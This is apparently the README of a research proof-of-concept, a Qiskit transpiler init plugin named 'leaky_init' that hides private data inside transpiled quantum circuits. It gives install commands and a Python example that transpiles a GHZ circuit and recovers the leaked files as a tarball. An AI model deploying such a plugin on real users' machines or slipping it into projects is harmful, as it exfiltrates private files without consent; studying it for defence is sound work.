# qiskit-ancilla-qubit-attack

A transpilation init plugin that can be used with Qiskit to leak private information.

## Instalation

```shell
git clone git@github.com:cryptohslu/qiskit-leaky-init.git
cd qiskit-leaky-init
pip install .
```

## Example

```python
import hashlib
import io
import tarfile
from pathlib import Path

from qiskit.circuit import QuantumCircuit
from qiskit.transpiler.preset_passmanagers import generate_preset_pass_manager
from qiskit.transpiler.preset_passmanagers.plugin import list_stage_plugins
from qiskit_ibm_runtime import QiskitRuntimeService
from qiskit_ibm_runtime.fake_provider import FakeBrisbane

from qiskit_leaky_init import extract_data, recover_data

# Check that init plugin was installed correctly
assert "leaky_init" in list_stage_plugins("init")

backend = FakeBrisbane()
pm = generate_preset_pass_manager(
    optimization_level=3, backend=backend, init_method="leaky_init"
)

# 3-qubit GHZ circuit
qc = QuantumCircuit(3)
qc.h(0)
qc.cx(0, range(1, 3))

# Transpiled circuit with leaked data
isa_qc = pm.run(qc)
leaked_data = recover_data(isa_qc)

# List leaked files
with io.BytesIO(leaked_data) as file:
    with tarfile.open(fileobj=file, mode="r:bz2") as tarball:
        tarball.list()

# Extract all files to temporary directory
# extract_data(data)
```